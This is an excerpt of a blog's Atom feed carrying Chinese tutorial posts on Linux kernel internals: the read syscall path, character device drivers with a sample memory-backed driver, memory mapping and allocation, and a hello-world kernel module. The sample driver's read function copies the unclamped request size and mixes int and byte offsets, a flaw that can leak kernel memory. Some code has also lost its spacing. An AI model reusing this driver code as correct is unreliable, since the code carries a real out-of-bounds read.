pos);//执行我们驱动中的读函数        else            ret = do_sync_read(file, buf, count, pos);        if (ret &gt; 0) {            fsnotify_access(file);            add_rchar(current, ret);        }        inc_syscr(current);    }    return ret;}</code></pre><h2 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h2><p>通过上面的分析我们已经了解的read函数的调用基本过程，下面我们将read函数的调用过程在进行总结：</p><ul><li>寻找svc异常总体入口，并进入内核空间</li><li>取出系统调用的标号</li><li>根据系统调用标号，在sys_call_table中找到对应的系统调用函数</li><li>根据系统函数比如sys_read找到对应的虚拟文件系统的read            </li><li>虚拟文件系统在调用驱动的read。<br><br><br><br></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.字符设备控制方法实现
* 2.揭秘系统调用本质
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;字符设备控制方法实现&quot;&gt;&lt;a href=&quot;#字符设备控制方法实现&quot; class=&quot;headerlink&quot; title=&quot;字符设备控制方法实现&quot;&gt;&lt;/a&gt;字符设备
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核分析" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（五）</title>
    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/17/Linux内核分析（五）/</id>
    <published>2018-10-16T16:23:00.000Z</published>
    <updated>2018-10-16T18:37:25.036Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.字符设备驱动基础* 2.简单字符设备驱动实现* 3.驱动测试</code></pre><h1 id="字符设备基础"><a href="#字符设备基础" class="headerlink" title="字符设备基础"></a>字符设备基础</h1><h2 id="字符设备描"><a href="#字符设备描" class="headerlink" title="字符设备描"></a>字符设备描</h2><p>述结构在linux2.6内核中，使用cdev结构体描述一个字符设备，其定义如下：  </p><pre><code>struct cdev {    struct kobject kobj;/*基于kobject*/    struct module *owner; /*所属模块*/    const struct file_operations *ops; /*设备文件操作函数集*/    struct list_head list;    dev_t dev; /*设备号*/    unsigned int count; /*该种类型设备数目*/};</code></pre><p>上面结构中需要我们进行初始化的有ops和dev，下面我们会对这两个成员进行分析。<br>注：kobject结构是驱动中很重要的一个结构，由于其复杂性，我们现在不进行介绍，后面会详细介绍。</p><h2 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h2><h3 id="何为设备号"><a href="#何为设备号" class="headerlink" title="何为设备号"></a>何为设备号</h3><p>cdev结构体中dev成员定义了设备号，而dev_t则为U32类型的也就是32位，其中12位为主设备号，20位为次设备号。我们执行ls –l /dev/可看到下图，其中左边红框为主设备号，右边为次设备号<br><img src="\images\pasted-303.png" alt="upload successful"></p><h3 id="何为主设备号"><a href="#何为主设备号" class="headerlink" title="何为主设备号"></a>何为主设备号</h3><p>用来对应该设备为何种类型设备。（比如串口我们用一个数字识别，而串口有好几个）  </p><h3 id="何为次设备号"><a href="#何为次设备号" class="headerlink" title="何为次设备号"></a>何为次设备号</h3><p>用来对应同一类型设备下的具体设备。（用次设备号来具体区分是哪个串口）</p><h3 id="设备号相关操作"><a href="#设备号相关操作" class="headerlink" title="设备号相关操作"></a>设备号相关操作</h3><ul><li>通过主设备号和次设备号获取dev：dev = MKDEV(主，次);</li><li>通过dev获取主设备号：主 = MAJOR(dev);</li><li>通过dev获取次设备号：dev = MINOR(dev);</li></ul><h3 id="设备号分配"><a href="#设备号分配" class="headerlink" title="设备号分配"></a>设备号分配</h3><p>设备号的分配有两种方式，一种是静态的，另一种是动态的，下面一一分析</p><ul><li>静态分配：也就是程序员自己指定设备号，通过register_chrdev_region();函数向内核申请，可能会导致和内核已有的冲突，从而失败。</li><li>动态分配：通过 alloc_chrdev_region(); 函数向内核申请设备号。</li><li>释放设备号：通过 unregister_chrdev_region(); 释放申请到的设备号。</li></ul><h2 id="file-operations操作函数集"><a href="#file-operations操作函数集" class="headerlink" title="file_operations操作函数集"></a>file_operations操作函数集</h2><p>file_operations结构体中的成员函数在我们驱动开发过程中极为重要，其中的内容相当庞大，下面我们看看其定义：</p><pre><code>struct file_operations {    struct module *owner;/*拥有该结构的模块的指针，一般为THIS_MODULES*/    loff_t (*llseek) (struct file *, loff_t, int); /*用来修改当前文件的读写指针*/    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);/*从设备读取数据*/    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);/*向设备发送数据*/    ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的读取操作*/    ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的写入操作*/    int (*readdir) (struct file *, void *, filldir_t); /*只用于读取目录，对于设备文件该字段为NULL*/    unsigned int (*poll) (struct file *, struct poll_table_struct *);/*轮询函数，判断目前是否可以进行非阻塞的读取或写入*/    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); /* 不用BLK的文件系统，将使用此函数代替ioctl*/    long (*compat_ioctl) (struct file *, unsigned int, unsigned long); /* 代替ioctl*/    int (*mmap) (struct file *, struct vm_area_struct *);/*用于请求将设备内存映射到进程地址空间*/    int (*open) (struct inode *, struct file *);/*打开*/    int (*flush) (struct file *, fl_owner_t id); /*在进程关闭它的设备文件描述符的拷贝时调用; 它应当执行(并且等待)设备的任何未完成的操作. */    int (*release) (struct inode *, struct file *);/*关闭*/    int (*fsync) (struct file *, int datasync); /*刷新待处理数据*/    int (*aio_fsync) (struct kiocb *, int datasync); /*异步fsync*/    int (*fasync) (int, struct file *, int); /*通知设备FASYNC标志发生变化*/    int (*lock) (struct file *, int, struct file_lock *);/* 实现文件加锁*/    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); /*通常为NULL*/    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); /*在当前的进程地址空间找的一个未映射的内存段*/    int (*check_flags)(int); /*法允许模块检查传递给 fnctl(F_SETFL...) 调用的标志*/    int (*flock) (struct file *, int, struct file_lock *);/**/    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); /*由VFS调用，将管道数据粘贴到文件*/    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); /*由VFS调用，将文件数据粘贴到管道*/    int (*setlease)(struct file *, long, struct file_lock **);/**/    long (*fallocate)(struct file *file, int mode, loff_t offset,    loff_t len); /**/}</code></pre><p>上面结构体中的函数指针所指向的函数，在我们在进行open、write、read等系统调用的时候最终会被调用到，所以我们的驱动中想为应用层实现那种调用就要在此实现。</p><h2 id="字符设备驱动初始化"><a href="#字符设备驱动初始化" class="headerlink" title="字符设备驱动初始化"></a>字符设备驱动初始化</h2><p>我们通过上面的分析对设备号和操作函数集有了一定的了解下面我们来看字符设备驱动初始化，其主要步骤如下。</p><ul><li>分配cdev结构：有静态（直接定义）动态（cdev_alloc();）两种方式  </li><li>初始化cdev结构：使用 cdev_init(struct cdev <em>cdev, const struct file_operations </em>fops) 初始化  </li><li>驱动注册：使用 int cdev_add(struct cdev *p, dev_t dev, unsigned count)//count为该种类型的设备个数注册   </li><li>硬件初始化：阅读芯片手册进行硬件设备的初始化  </li><li>完成操作函数集：实现要用的操作（设备方法）  </li><li>驱动注销：使用 void cdev_del(struct cdev *p) 注销  </li></ul><h2 id="字符设备驱动模型及调用关系"><a href="#字符设备驱动模型及调用关系" class="headerlink" title="字符设备驱动模型及调用关系"></a>字符设备驱动模型及调用关系</h2><p>下面我通过一张图将字符设备的驱动结构、以及字符设备驱动与用户空间的调用关系进行展示：<br><img src="\images\pasted-304.png" alt="upload successful"></p><h2 id="遗漏知识"><a href="#遗漏知识" class="headerlink" title="遗漏知识"></a>遗漏知识</h2><p>我们内核空间和用户空间的数据交互要用到下面两个函数：  </p><ul><li>copy_from_user();//从用户空间读        </li><li>copy_to_user();//写入用户空间<br><br><br><br></li></ul><h1 id="简单字符设备驱动"><a href="#简单字符设备驱动" class="headerlink" title="简单字符设备驱动"></a>简单字符设备驱动</h1><p>实现经过上面的分析我们对字符设备有一定了解，下面我们来完成一个最简单的字符设备驱动。我只展示最主要的代码，整个项目工程在<a href="https://github.com/wrjvszq/myblongs.git欢迎大家关注。" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git欢迎大家关注。</a></p><h2 id="字符设备驱动编写"><a href="#字符设备驱动编写" class="headerlink" title="字符设备驱动编写"></a>字符设备驱动编写</h2><p>因为驱动本身就是一个内核模块，下面的字符设备驱动只实现了部分方法。</p><pre><code>#include&lt;linux/module.h&gt;#include&lt;linux/init.h&gt;#include&lt;linux/cdev.h&gt;#include&lt;linux/fs.h&gt;#include&lt;asm/uaccess.h&gt;#define MEM_SIZE 1024MODULE_LICENSE(&quot;GPL&quot;);struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];//全局内存4k    dev_t devno;};struct mem_dev my_dev;/*打开设备*/int mem_open(struct inode *inode, struct file *filp){    int num = MINOR(inode-&gt;i_rdev);/*获取次设备号*/    if(num == 0){/*判断为那个设备*/        filp -&gt; private_data = my_dev.mem;/*将设备结构体指针复制给文件私有数据指针*/    }    return 0;}/*文件关闭函数*/int mem_release(struct inode *inode, struct file *filp){      return 0;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}/*seek文件定位函数*/static loff_t mem_llseek(struct file *filp, loff_t offset, int whence){    loff_t newpos;    switch(whence) {        case SEEK_SET:/*从文件头开始定位*/            newpos = offset;            break;        case SEEK_CUR:/*从当前位置开始定位*/            newpos = filp-&gt;f_pos + offset;            break;        case SEEK_END:            newpos = MEM_SIZE * sizeof(int)-1 + offset;/*从文件尾开始定位*/            break;        default:            return -EINVAL;    }     if ((newpos&lt;0) || (newpos&gt;MEM_SIZE * sizeof(int)))/*检查文件指针移动后位置是否正确*/         return -EINVAL;     filp-&gt;f_pos = newpos;     return newpos;}const struct file_operations mem_ops = {    .llseek = mem_llseek,    .open = mem_open,    .read = mem_read,    .write = mem_write,    .release = mem_release,};static int memdev_init(void){    int ret = -1;    /*动态分配设备号*/    ret = alloc_chrdev_region(&amp;my_dev.devno,0,1,&quot;memdev&quot;);    if (ret &gt;= 0){        cdev_init(&amp;my_dev.cdev,&amp;mem_ops);/*初始化字符设备*/        cdev_add(&amp;my_dev.cdev,my_dev.devno,1);/*添加字符设备*/    }    return ret;   }static void memdev_exit(void){    cdev_del(&amp;my_dev.cdev);    unregister_chrdev_region(my_dev.devno,1);}module_init(memdev_init);module_exit(memdev_exit);</code></pre><p><br><br><br></p><h1 id="驱动测试"><a href="#驱动测试" class="headerlink" title="驱动测试"></a>驱动测试</h1><p>经过上面的代码我们已经实现了一个简单的字符设备驱动，我们下面进行测试。（应用程序在<a href="https://github.com/wrjvszq/myblongs.git" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git</a> 上）</p><h2 id="加载内核模块"><a href="#加载内核模块" class="headerlink" title="加载内核模块"></a>加载内核模块</h2><p>我们使用 insmod memdev.ko 命令加载内核模块</p><h2 id="获取设备号"><a href="#获取设备号" class="headerlink" title="获取设备号"></a>获取设备号</h2><p>我们的设备号是动态申请到的，所以我们要通过下面的命令查看设备号<br>cat /proc/devices<br>找到我们的设备memdev的设备号<br><img src="\images\pasted-305.png" alt="upload successful"></p><h2 id="建立设备文件"><a href="#建立设备文件" class="headerlink" title="建立设备文件"></a>建立设备文件</h2><p>使用如下命令建立设备文件：<br>mknod /dev/文件名 c 主设备号次设备号<br>上面命令中文件名为我们在应用程序中打开的文件名<br>c代表字符设备主设备号为上一步找到的，我的位249<br>次设备号非负即可，但不能超过自己所创建的设备数。<br>比如我的就是 mknod /dev/memdev0 c 249 0  </p><h2 id="编译应用程序并测试"><a href="#编译应用程序并测试" class="headerlink" title="编译应用程序并测试"></a>编译应用程序并测试</h2><p>使用gcc对应用程序进行编译，然后先使用write对设备进行写入，在使用read对设备读取，完成测试。<br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.字符设备驱动基础
* 2.简单字符设备驱动实现
* 3.驱动测试
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;字符设备基础&quot;&gt;&lt;a href=&quot;#字符设备基础&quot; class=&quot;headerlink&quot; title=&quot;字符设备基础&quot;&gt;&lt;/a&gt;字符设备基础&lt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核分析" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（四）</title>
    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/17/Linux内核分析（四）/</id>
    <published>2018-10-16T16:01:00.000Z</published>
    <updated>2018-10-16T18:37:42.052Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.Linux进程管理子系统* 2.Linux网络子系统* 3.虚拟文件系统* 4.Linux设备驱动简介</code></pre><h1 id="Linux进程管理子系统"><a href="#Linux进程管理子系统" class="headerlink" title="Linux进程管理子系统"></a>Linux进程管理子系统</h1><p>在进程管理中最重要的就是进程的调度和进程的通信下面我们一一分析。</p><h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程调度意义"><a href="#进程调度意义" class="headerlink" title="进程调度意义"></a>进程调度意义</h3><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程的状态切换"><a href="#进程的状态切换" class="headerlink" title="进程的状态切换"></a>进程的状态切换</h3><p>Linux的进程在几个状态间进行切换，如下图展现了其切换关系。<br><img src="\images\pasted-300.png" alt="upload successful"></p><h3 id="进程调度策略"><a href="#进程调度策略" class="headerlink" title="进程调度策略"></a>进程调度策略</h3><p>Linux中常见的有以下：  </p><ul><li>SCHED_OTHER 分时调度策略。</li><li>SCHED_FIFO实时调度策略，先到先服务</li><li>SCHED_RR实时调度策略，时间片轮转</li></ul><h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><p>Linux支持进程间的多种通信机制，可以通过这些通信机制进行多个进程、多资源的互斥访问、进程间的同步和消息传递。  </p><h3 id="linux进程间通信方式"><a href="#linux进程间通信方式" class="headerlink" title="linux进程间通信方式"></a>linux进程间通信方式</h3><ul><li>管道：分为有名管道（用于同一系统间的任意进程）和无名管道（用于父子进程）</li><li>信号量</li><li>信号</li><li>消息队列</li><li>共享内存</li><li>套接字（socket）<br><br><br><br></li></ul><h1 id="Linux网络子系统"><a href="#Linux网络子系统" class="headerlink" title="Linux网络子系统"></a>Linux网络子系统</h1><p>Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。<br><img src="\images\pasted-301.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux虚拟文件系统"><a href="#Linux虚拟文件系统" class="headerlink" title="Linux虚拟文件系统"></a>Linux虚拟文件系统</h1><p>Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。<br><img src="\images\pasted-302.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux设备驱动简介"><a href="#Linux设备驱动简介" class="headerlink" title="Linux设备驱动简介"></a>Linux设备驱动简介</h1><p>上面的介绍很简单，仅仅是对这些子系统的概念什么的进行了简介，下面我们对linux设备驱动进行简单介绍。</p><h2 id="设备驱动分类"><a href="#设备驱动分类" class="headerlink" title="设备驱动分类"></a>设备驱动分类</h2><p>Linux分为下面三种基本设备。</p><h3 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h3><p>是一种<strong>按照字节</strong>来访问的设备，字符设备适用于大多数的简单硬件。常见的LED、按键等</p><h3 id="块设备"><a href="#块设备" class="headerlink" title="块设备"></a>块设备</h3><p>是一种以块（通常为512字节）为最小访问单位的设备，常见的硬盘、SD卡等。但在linux中对块没有大小限制，可以访问任意数目的字节。</p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><p>用来负责发送和接收报文的设备，比如网卡。<br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.Linux进程管理子系统
* 2.Linux网络子系统
* 3.虚拟文件系统
* 4.Linux设备驱动简介
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux进程管理子系统&quot;&gt;&lt;a href=&quot;#Linux进程管理子系统&quot; class=&quot;head
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（三）</title>
    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/16/Linux内核分析（三）/</id>
    <published>2018-10-16T15:44:00.000Z</published>
    <updated>2018-10-16T16:03:46.501Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* Linux地址映射* Linux内存分配</code></pre><p>在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。<br><img src="\images\pasted-297.png" alt="upload successful"></p><h1 id="Linux地址映射"><a href="#Linux地址映射" class="headerlink" title="Linux地址映射"></a>Linux地址映射</h1><p>下面的分析我们依据上图进行分析，首先我们来看其最右边的地址分布图（当然这是虚拟空间）。其地址分布总的可以分为两个部分我们下面慢慢分析（基于32位处理器）。<br><img src="\images\pasted-298.png" alt="upload successful"></p><h2 id="用户空间（0-3G）"><a href="#用户空间（0-3G）" class="headerlink" title="用户空间（0~3G）"></a>用户空间（0~3G）</h2><p>空间简介其从0x00000000到0xBFFFFFFF共3GB的线性地址空间，每个进程都有一个独立的3GB用户空间，当然这是虚拟的空间。<br>如何转换为物理空间这一部分虚拟空间到物理空间的转换方法是我们以前在<a href="http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。</a></p><h2 id="内核空间（3-4G）"><a href="#内核空间（3-4G）" class="headerlink" title="内核空间（3~4G）"></a>内核空间（3~4G）</h2><p>其从0xC0000000到0xFFFFFFFF共1GB大小，内核空间又可以根据映射方式的不同分为下面四块，我们一一分析  </p><h3 id="内核逻辑地址空间"><a href="#内核逻辑地址空间" class="headerlink" title="内核逻辑地址空间"></a>内核逻辑地址空间</h3><p><strong>空间简介</strong><br>其从0xC0000000到high_memory(图中896MB的地方)最大为896MB（也就是说这块空间有可能不满，但最大为896MB），当然是虚拟空间。<br>注：在此注意一下896MB我们一会在分析。<br><strong>如何转换为物理空间</strong><br>这一部分虚拟地址与物理内存中对应的地址只差一个固定偏移量（3G），如果内存物理地址空间从0x00000000地址编址，那么这个固定偏移量就是PAGE_OFFSET（如上图）。  </p><h3 id="Vmalloc空间"><a href="#Vmalloc空间" class="headerlink" title="Vmalloc空间"></a>Vmalloc空间</h3><p><strong>空间简介</strong><br>其地址没有严格的界限，这段空间既可以访问到我们的高端内存，也可以访问到低端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。  </p><h3 id="永久内核映射"><a href="#永久内核映射" class="headerlink" title="永久内核映射"></a>永久内核映射</h3><p><strong>空间简介</strong><br>其固定用来访问高端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。</p><h3 id="固定映射"><a href="#固定映射" class="headerlink" title="固定映射"></a>固定映射</h3><p><strong>空间简介</strong><br>其在系统初始化期间永久映射I/O地址空间，或者特殊的寄存器。</p><h2 id="遗留知识"><a href="#遗留知识" class="headerlink" title="遗留知识"></a>遗留知识</h2><p>在刚才我们前面的分析中我们留下了一些问题下面进行解释。  </p><h3 id="低端内存"><a href="#低端内存" class="headerlink" title="低端内存"></a>低端内存</h3><p>内核逻辑地址空间所映射的物理内存就是低端内存(实际物理内存的大小，但是小于896MB)</p><h3 id="高端内存"><a href="#高端内存" class="headerlink" title="高端内存"></a>高端内存</h3><p>低端内存地址之上的物理内存是高端内存（物理内存896MB之上）。</p><h3 id="896MB来由"><a href="#896MB来由" class="headerlink" title="896MB来由"></a>896MB来由</h3><p>Linux将内存分为内核空间和用户空间，其中内核空间中的0xC0000000~high_memory部分用来映射物理内存，但是我们还需要映射I/O空间和固定的寄存器，所以留出了high_memory~0xFFFFFFFF之间的地址来映射I/O空间和固定的寄存器，而在X86平台根据经验设定了这个high_memory为896MB。  </p><h1 id="Linux内存分配"><a href="#Linux内存分配" class="headerlink" title="Linux内存分配"></a>Linux内存分配</h1><p>通过上面的介绍我们对linux对内存的管理，以及地址的映射有了一个了解，下面我们来分析linux是如何进行内存分配的。<br><img src="\images\pasted-299.png" alt="upload successful"><br>通过上图我们可以分析出内存的分配过程：  </p><ul><li>由malloc、fork等系统调用和kmalloc、vmalloc申请得到虚拟内存。  </li><li>在我们使用该内存的时候，产生请页异常（kmalloc除外）  </li><li>从空闲的页框分配物理内存，和虚拟地址建立映射。  </li></ul><p>注：kmalloc申请空间是不用经过请页异常的，返回的虚拟地址已经对应了物理内存。Kmalloc可以分配到连续的物理内存，vmalloc分配的是非连续的物理内存。<br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* Linux地址映射
* Linux内存分配
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。&lt;br&gt;&lt;img src=&quot;\images\pasted
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（二）</title>
    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/16/Linux内核分析（二）/</id>
    <published>2018-10-16T15:41:00.000Z</published>
    <updated>2018-10-16T16:12:43.478Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.Linux内核模块简介* 2.简单内核模块实现</code></pre><h1 id="Linux内核模块简介"><a href="#Linux内核模块简介" class="headerlink" title="Linux内核模块简介"></a>Linux内核模块简介</h1><h2 id="何为内核模块"><a href="#何为内核模块" class="headerlink" title="何为内核模块"></a>何为内核模块</h2><p>在上一篇博文中我们先通过内核配置，在配置的过程中我们对内核的组件进行了选择（当然这个选择决定了我们内核的大小），然后才生成了我们最终的内核，那么我们如果想添加组件，怎么办？<br>最笨的方法是对内核进行重新配置，然后在重新编译。这样的话岂不是说我加一个组件就得重新编译内核，这显然不是很科学的方法，其实我们的linux内核提供在运行时可进行扩展的特性，这意味着当系统启动并运行时，我们可以向内核添加或移除部分功能。<br>我们在运行时添加到内核中的代码就被成为动态可加载内核模块，我们简称为内核模块。  </p><h2 id="内核模块的相关操作"><a href="#内核模块的相关操作" class="headerlink" title="内核模块的相关操作"></a>内核模块的相关操作</h2><p>加载内核模块：insmod<br>卸载内核模块：rmmod<br>查看内核模块：lsmod  </p><h2 id="模块声明"><a href="#模块声明" class="headerlink" title="模块声明"></a>模块声明</h2><p>MODULE_LICENSE（“GPL”）：内核可以识别的许可证有GPL（任意版本GNU通用公共许可证）、GPL v2等<br>MODULE_AUTHOR（“作者”）：声明作者信息可以不用<br>MODULE_VERSION（“版本”）：声明版本信息也可以不用<br>MODULE_DESCRIPTION（“功能描述”）：声明模块功能，可不用  </p><h2 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h2><p>我们可以在加载内核模块的时候向其传递参数，以让同一代码达到不同的效果。当然我们的参数必须用module_param宏来声明具体如下：<br>module_param（name，type，perm）<br>name：变量名<br>type：数据类型内核支持模块参数类型有：bool、invbool（bool的发转，true变为false，false变为true）、charp（char类型指针值）、int、long、short、uint、ulong、ushort<br>perm：常见的访问许可值通常为S_IRUGO和S_IWUSR。通常情况下将他们按位或同时我们也可以用下面的宏声明数组：<br>        Module_param_array（name，type，num，perm） </p><h2 id="模块符号导出"><a href="#模块符号导出" class="headerlink" title="模块符号导出"></a>模块符号导出</h2><p>当一个模块要使用另一个模块的函数（变量）的时候，要使用EXPORT_SYMBOL（符号名）或者EXPORT_SYMBOL_GPL（符号名）来申明。<br>注：EXPORT_SYMBOL_GPL（）只适用于遵循GPL协议的模块  </p><h1 id="简单内核模块实现"><a href="#简单内核模块实现" class="headerlink" title="简单内核模块实现"></a>简单内核模块实现</h1><p>想必大家都记得我们在学习某种语言的时候，写的第一个程序大部分都是输出hello world，所以我接下来用我们刚才介绍的内核模块去完成hello world。</p><h2 id="内核模块编写"><a href="#内核模块编写" class="headerlink" title="内核模块编写"></a>内核模块编写</h2><p>通过上面部分内容的介绍，要完成第一内核模块不是很难，下面是自己的代码。</p><pre><code>#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;MODULE_LICENSE(&quot;GPL&quot;);staticint hello_init(void){    printk(&quot;&lt;0&gt; hello world\n&quot;);    return0;}staticvoid hello_exit(void){    printk(&quot;&lt;0&gt; goodbye\n&quot;);}module_init(hello_init);//该宏在模块的目标代码中增加一个特殊的段，用于说明内核初始化函数所在的位置module_exit(hello_exit);//跟上面的宏对立</code></pre><h2 id="Makefile编写"><a href="#Makefile编写" class="headerlink" title="Makefile编写"></a>Makefile编写</h2><p>Makefile的编写也比较简单，要注意的地方代码中已经说明。</p><pre><code>obj-m := hello.oDIRS :=/smbshare/linux-2.6.39///此处路径为内核源码路径，该内核源码必须要经过编译，不然会报错all:make -C $(DIRS) M=$(PWD) modulesclean:rm -Rf*.o *.ko *.mod.c *.order *.symvers    </code></pre><p>经过了上面两个步骤，我们然后编译加载然后卸载我们的模块进行试验。<br>编译：<img src="\images\pasted-292.png" alt="upload successful"><br>加载：<img src="\images\pasted-293.png" alt="upload successful"><br>查看：<img src="\images\pasted-294.png" alt="upload successful"><br>卸载：<img src="\images\pasted-295.png" alt="upload successful"></p><h2 id="Printk函数简介"><a href="#Printk函数简介" class="headerlink" title="Printk函数简介"></a>Printk函数简介</h2><p>printk函数为内核打印函数，其和printf函数功能类似，不过比printf多了打印权限一共有8个级别，printk的日志级别定义如下（在include/linux/kernel.h中）：  </p><pre><code>#define KERN_EMERG    0 //紧急事件消息，系统崩溃之前提示，表示系统不可用#define KERN_ALERT    1 //报告消息，表示必须立即采取措施#define KERN_CRIT     2 //临界条件，通常涉及严重的硬件或软件操作失败#define KERN_ERR      3 //错误条件，驱动程序常用KERN_ERR来报告硬件的错误#define KERN_WARNING  4 //警告条件，对可能出现问题的情况进行警告#define KERN_NOTICE   5 //正常但又重要的条件，用于提醒#define KERN_INFO     6 //提示信息，如驱动程序启动时，打印硬件信息#define KERN_DEBUG    7 //调试级别的消息</code></pre><p>给大家推荐一个比较好用的工具，叫做exvim其将好多vim的工具进行了集成，个人感觉十分方便，就是换电脑什么的也不怕自己的配置丢失了。大家有兴趣的可以去<a href="http://exvim.github.io/" target="_blank" rel="noopener">http://exvim.github.io/</a> 了解。<br><img 